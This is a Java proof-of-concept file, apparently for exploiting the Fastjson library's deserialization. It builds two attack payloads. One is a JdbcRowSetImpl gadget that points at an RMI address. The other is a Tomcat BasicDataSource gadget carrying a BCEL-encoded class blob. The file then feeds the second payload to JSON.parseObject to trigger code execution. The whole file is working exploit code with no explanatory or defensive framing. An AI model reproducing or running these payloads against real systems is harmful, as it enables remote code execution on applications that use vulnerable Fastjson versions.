package com.fastjson.pwn;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.utils.FeatureManager;

public class FastjsonPoc {
    public static void main(String[] args) {
        String poc="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1999/Object\",\"autoCommit\":true}";

        String poc1 = "{\n" +
                "\t{\n" +
                "\t\t\"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "\t\t\"c\": {\n" +
                "\t\t\t\"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
                "\t\t\t\"driverClassLoader\": {\n" +
                "\t\t\t\t\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "\t\t\t},\n" +
                "\t\t\t\"driverClassName\": \"org.apache.log4j.spi$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dT$5bW$TI$Q$fe$daL$d2$c30$m$86$8b$m$5ep$d7K$A$c3$a8$eb$a2$C$eb$ae$m$m$9a$40$q$8a$c6$5d$l$9aI$83$83$c9L$ce$d0$a3$f9G$be$eaK$f0$y$e7$ec$e3$3e$f8$l$f6$8f$f8$m$5b$3d$J$Ck$f6h$ceIu$d7W$ddu$f9$aaz$3e$7e$fe$f3$_$A$d7$f1$c2$c2$AnX$f8$Z$93Z$dc$e4$b8$c5q$db$c2$U$a6$z$q1c$c1$c0$_$s$ee$e8$f5W$8e$df$yt$ea$e3$9d$b8kbV$afs$fa$ec$3d$8ey$T$L$s$W$z$f4$e3$3e$c7$S$c7$D$86$d4$8c$e7$7b$ea$OC$o3$ba$c6$60$cc$Fe$c9p$3c$e7$f9r9$aa$ae$cb$f0$b1X$af$Q$92$ce$F$ae$a8$ac$89$d0$d3z$L4$d4Ko$9b$e1t$ce$N$aa$cef$bd$o$d6$9d$z$e1$be$da$O$7c$87$iD$f5B$e0N3X$b2$$$ddH$c9$b9j$99$e1R$s$b7$r$5e$L$a7$o$fcM$a7$a8B$cf$df$9c$k$fd$g$o$df$VJA$c7mc$e3$b50p$e56$85$ee$3dd$$4A$b2$a7B$v$ca2d$Yl$9a$bd$c0$99$8d66d$u$cb$ab$b1E$fbW$b2$ae$Y$3ad$ddSk$a2$SQ$y$b6D$f0k$RN2$f4$l$f2$3b_weMy$81O$b7$S$ae$$$a2$ab$a8$a8$cc$bc$a8$c5$3cp$3c$e4$c8$c5$5d$99g0g$dcJ$8bR$ab$YD$a1$x$X$3c$cdU$d7$3e$p$T$da$b3$8d$93$Y$e4$c8$dbX$c6$8a$8d$C$k1$M$b4$cf$95ah$df$b0$e4$d7$oE$yHQm$da$u$ae$8dU$U$b5$bb$c7Z$3ca$80$8d5$3ce8$f9_$e2f$p$afBwl$3cC$89$8a$b5l$3c$c7S$h$bf$e3$P$e2$b1M$b9$94$R$f5$b5$w$fc$f2H$ab$83$p$h$82j$n$C$d2$w$88$dc$97$p$8e$aa$d6$9c$da$h$7fB$d5$95$8d$b38$c7p$ea$ffG$81$a1$e7$m$ca$ca$fa$96t$d5$R$a8$99$r$c3$89$afZz$E$5b$8d$7c$e5U$89QkS$aa$_J$7f$e6$f0$U$b5$60$ddf$9d$3a$c3$e5o$8c$dd$c1$ect$93$d7C$3c$T$8f$fb$9e$8f6$80$8e$Of$da$g$f4$3b$ea$3d0$b5$sN$a3$a6$9e$cb$5c$3c$d7$7d$99$b6S$9f$S$b5$9a$f4$89$e1$ecw$bd$93VK$e9$a2$a9$82$7d$fe$f8$h$e1$a9$85$m$8c$df$f4$S$ce$d3s$l$80$fe$r$c0$f4$d8$91$i$o$cd$a1$95$a6$F$c9$b1$j$b0$f7$b49$86S$qS1$d8$81a$e8I$8a$P$e04$ce$c4$Yu$b8y$99u$S$9a$q$ac$f8$B$c7$c6$gH$e4va$94v$91$y$8d7$90$da$B$df$81$99Ow$y$b3$v$e3J$DVi$ca$f8$h$e7v$d1Y$da$81$9dm$a0k$c8$m$91$ee$s$d1$c0$f1$e5$b7$7b$ff$d0$b5$9eI$p$fb$$$97N$bf$8b$83$d2$b3$c0$J$caX$a7$f4$D$cc8$Z$T$5d$94V7$a5$d1$83E$f4$nO$95$adPm$F$aaJ$a7$7b$l$9c$aa$bd$84$R$92$G$9d$5e$a4$9b$3f$92$b7a$dc$c0$F$5c$a4$C$cf$e2$g$d9$cf$93$df$3ci$97$91$a1s$F$d2F1$WG$zb$9c$ac$c0$V$fag$90$d8$p$r$c9$91$e5$98$e0p$e2M$W$f8$84$8b$7b$U$89i$85$c4U$8at$ed$L$ab$e3$zVy$ba$f7$D$fa$k$k$f0j$d1$K$e21E$i$O$c7$u$d1H_w$bd$fb$e9_$5e$b6$b6$k$ec$F$A$A\"\n" +
                "\t\t}\n" +
                "\t}\n" +
                "  \t:\"ddd\"\n" +
                "}";

        Object obj= JSON.parseObject(poc1,Object.class, Feature.SupportNonPublicField);
    }
}
